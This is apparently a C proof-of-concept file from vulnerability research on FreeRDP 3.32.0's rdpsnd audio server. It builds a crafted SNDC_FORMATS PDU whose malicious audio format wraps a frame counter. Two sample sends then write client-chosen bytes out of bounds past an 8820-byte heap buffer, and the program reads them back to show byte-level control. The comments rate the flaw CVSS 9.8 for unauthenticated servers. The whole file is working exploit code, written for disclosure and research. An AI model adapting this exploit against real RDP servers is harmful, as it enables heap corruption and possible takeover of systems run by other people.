/*
 * PocRdpsndChosenBytes.c — rung 4 on REAL FreeRDP 3.32.0 bytes.
 *
 * Feeds a crafted SNDC_FORMATS PDU through the real 3.32.0
 * rdpsnd_server_recv_formats() parser, selects the benign then the malicious
 * format, and makes TWO rdpsnd_server_send_samples() calls with
 * distinguishable client buffers. The wrapped out_frames makes each call copy
 * 16384 bytes at a monotonically advancing offset; chosen marker bytes are
 * read back from the still-8820-byte out_buffer at OOB offsets 8820 and
 * 21384.
 *
 * This build is deliberately NOT ASan-instrumented: ASan aborts on the first
 * OOB write, so it cannot observe the second call. The ASan PoCs in this
 * directory establish the corruption; this one establishes byte-level control.
 *
 * Still in-process: no virtual-channel transport, no RDP session, no auth
 * gate, no stock server heap grooming. Default posture is post-auth (PR:L);
 * only no-auth deployments reach CVSS 9.8.
 */
#include <freerdp/codec/audio.h>
#include <winpr/stream.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
static BYTE dvi_ext[2] = { 0xf9, 0x07 };
static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };

/* Real 3.32.0 server source; supplies the static SNDC_FORMATS parser and the
 * real select/send implementations in this translation unit. */
#include "rdpsnd_main.c"

#define CALL_BYTES 16384u
#define WATCH1 8820u                 /* first byte past the 8820-byte buffer */
#define WATCH2 (CALL_BYTES + 5000u)  /* second call: 16384 + 5000 = 21384 */

static volatile BYTE* g_out;

int main(void)
{
	BYTE pdu[512];
	wStream* s = Stream_New(pdu, sizeof pdu);
	BYTE* b1;
	BYTE* b2;
	UINT rc, rc2;
	BYTE w1, w2, inb, oob1, oob2;
	int ok = 1;

	setvbuf(stdout, NULL, _IONBF, 0);

	/* SNDC_FORMATS: dwFlags, dwVolume, dwPitch, wDGramPort, wNumberOfFormats,
	 * cLastBlockConfirmed, wVersion, bPad; then two audio format records. */
	Stream_Write_UINT32(s, 0);
	Stream_Write_UINT32(s, 0xffffffff);
	Stream_Write_UINT32(s, 0);
	Stream_Write_UINT16(s, 0);
	Stream_Write_UINT16(s, 2);
	Stream_Write_UINT8(s, 0);
	Stream_Write_UINT16(s, 1);
	Stream_Write_UINT8(s, 0);
	audio_format_write(s, &fmt_pcm);
	audio_format_write(s, &fmt_dvi);
	Stream_SetPosition(s, 0);

	RdpsndServerContext* ctx = rdpsnd_server_context_new(NULL);
	ctx->src_format = &fmt_pcm;
	ctx->latency = 50;
	InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

	rc = rdpsnd_server_recv_formats(ctx, s);
	printf("recv_formats rc=%u nformats=%u\n", rc, ctx->num_client_formats);
	if (rc != 0 || ctx->num_client_formats != 2)
		return 2;
	printf("parsed[1]: tag=%u channels=%u blockalign=%u cbsize=%u\n",
	       ctx->client_formats[1].wFormatTag, ctx->client_formats[1].nChannels,
	       ctx->client_formats[1].nBlockAlign, ctx->client_formats[1].cbSize);

	ctx->SelectFormat(ctx, 0); /* benign PCM: allocates 8820 bytes */
	rc2 = ctx->SelectFormat(ctx, 1);
	g_out = (volatile BYTE*)ctx->priv->out_buffer;
	printf("SelectFormat rc=%u out_frames=0x%016zx out_buffer_size=%zu\n", rc2,
	       ctx->priv->out_frames, ctx->priv->out_buffer_size);
	if (ctx->priv->out_frames != (size_t)-16 || ctx->priv->out_buffer_size != 8820)
		return 3;

	/* Call 1 covers [0,16384), call 2 covers [16384,32768). Markers chosen by
	 * the client sit at 8820 (first OOB byte) and 21384 (second call). */
	b1 = (BYTE*)malloc(CALL_BYTES);
	b2 = (BYTE*)malloc(CALL_BYTES);
	memset(b1, 0x11, CALL_BYTES);
	memset(b2, 0x22, CALL_BYTES);
	b1[WATCH1] = 0xDE;
	b2[WATCH2 - CALL_BYTES] = 0xAD;

	ctx->SendSamples(ctx, b1, 4096, 0);
	ctx->SendSamples(ctx, b2, 4096, 0);

	/* Reads are safe here: the writes above already proved those addresses
	 * are mapped and writable in this process. */
	w1 = g_out[WATCH1];
	w2 = g_out[WATCH2];
	inb = g_out[8819];
	oob1 = g_out[8821];
	oob2 = g_out[CALL_BYTES];

	printf("readback offset 8819  = %02x (want 11, last in-bounds byte)\n", inb);
	printf("readback offset 8820  = %02x (want de, client marker, call 1)\n", w1);
	printf("readback offset 8821  = %02x (want 11, call 1)\n", oob1);
	printf("readback offset 16384 = %02x (want 22, call 2 start)\n", oob2);
	printf("readback offset 21384 = %02x (want ad, client marker, call 2)\n", w2);
	printf("out_pending_frames=%zu out_frames=0x%016zx (never reached)\n",
	       ctx->priv->out_pending_frames, ctx->priv->out_frames);

	ok = (inb == 0x11) && (w1 == 0xDE) && (oob1 == 0x11) && (oob2 == 0x22) &&
	     (w2 == 0xAD) && (ctx->priv->out_pending_frames == 8192);
	printf("[rung4] RESULT=%s\n", ok ? "PASS" : "FAIL");
	/* Normal teardown frees the corrupted heap and faults; evidence is
	 * complete, so leave without running destructors. */
	fflush(stdout);
	_exit(ok ? 0 : 1);
}
